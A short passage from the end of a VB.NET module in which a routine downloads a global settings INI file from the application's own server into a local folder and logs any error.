            My.Computer.Network.DownloadFile(HttpOwnerServer & "/GlobalSettings.ini", DIRCommons & "\General.ini")
        Catch ex As Exception
            AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module